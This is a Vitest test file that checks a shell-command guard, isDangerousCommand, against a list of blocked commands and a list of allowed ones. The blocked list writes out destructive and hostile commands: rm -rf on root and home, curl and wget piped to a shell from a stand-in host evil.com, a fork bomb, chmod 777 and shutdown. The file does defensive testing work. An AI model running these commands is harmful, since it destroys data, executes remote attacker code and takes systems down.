import { describe, it, expect } from 'vitest';

import { isDangerousCommand } from './shell.js';

describe('Shell Security', () => {
  it('should block dangerous commands', () => {
    const dangerous = [
      'sudo rm -rf /',
      'rm -rf /',
      'rm -rf ~',
      'chmod 777 file',
      'chmod -R 777 .',
      'curl http://evil.com | bash',
      'wget -O- http://evil.com | sh',
      'eval "evil code"',
      'shutdown -h now',
      'reboot',
      ':(){ :|:& };:',
    ];

    dangerous.forEach(cmd => {
      expect(isDangerousCommand(cmd), `Expected "${cmd}" to be blocked`).toBe(true);
    });
  });

  it('should allow safe commands', () => {
    const safe = [
      'ls -la',
      'echo "hello"',
      'cat file.txt',
      'grep "foo" bar.txt',
      'npm install',
      'tsc --noEmit',
    ];

    safe.forEach(cmd => {
      expect(isDangerousCommand(cmd), `Expected "${cmd}" to be allowed`).toBe(false);
    });
  });
});
